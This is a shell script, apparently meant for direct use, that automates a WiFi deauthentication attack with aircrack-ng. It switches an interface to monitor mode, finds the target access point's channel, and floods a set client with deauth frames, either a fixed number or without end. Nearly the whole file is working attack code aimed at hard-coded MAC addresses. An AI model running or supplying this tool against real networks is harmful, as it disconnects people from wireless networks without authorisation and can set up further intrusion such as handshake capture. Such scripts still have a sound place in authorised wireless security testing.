#!/bin/sh

# Change these parameters

INTERFACE="wlan0" # name of wifi interface
AP_BSSID="60:63:4C:7D:1B:82" # access point MAC address
CLIENT_BSSID="F4:CB:52:C0:9D:5B" # target client MAC address
COUNT=100 # You can set COUNT to 0 to run the attack indefinitely

clean() {
echo "
Switching back to managed mode..."
sudo airmon-ng stop "${INTERFACE}mon" >/dev/null
}

if [ "$1" = '-h' -o "$1" = '--help' ]; then
  echo "\
Launch automated deauthentification wifi attack on targeted access point and client (using aircrack-ng)

Options :
  -h, --help  display this help and exit

Change the following parameters in the script :
interface, AP BSSID, Client BSSID and deauth count"
  exit 0
fi

which aircrack-ng >/dev/null || exit 1
which ip >/dev/null || exit 1

sudo echo "\
Target access point : $AP_BSSID
Target client : $CLIENT_BSSID"

if ! ip addr show "${INTERFACE}mon" >/dev/null 2>&1; then
  echo "Switching $INTERFACE to monitor mode..."
  sudo airmon-ng start "$INTERFACE" >/dev/null || exit 1
fi

trap 'exit 1' 1 2 3 15
trap clean EXIT
output=$(sudo aireplay-ng --test -a "$AP_BSSID" -c "$CLIENT_BSSID" "${INTERFACE}mon" 2>&1)
echo $output | grep "No such BSSID" >&2 && exit 1 
AP_channel=$(echo $output | awk '/but the AP/ {print $NF}')
if [ "$AP_channel" ]; then
  echo "Setting ${INTERFACE}mon to AP channel $AP_channel..."
  sudo airmon-ng start "${INTERFACE}mon" $AP_channel >/dev/null || exit 1
fi

echo "Starting deauth attack..."
sleep 1
sudo aireplay-ng --deauth $COUNT -a $AP_BSSID -c $CLIENT_BSSID "${INTERFACE}mon"
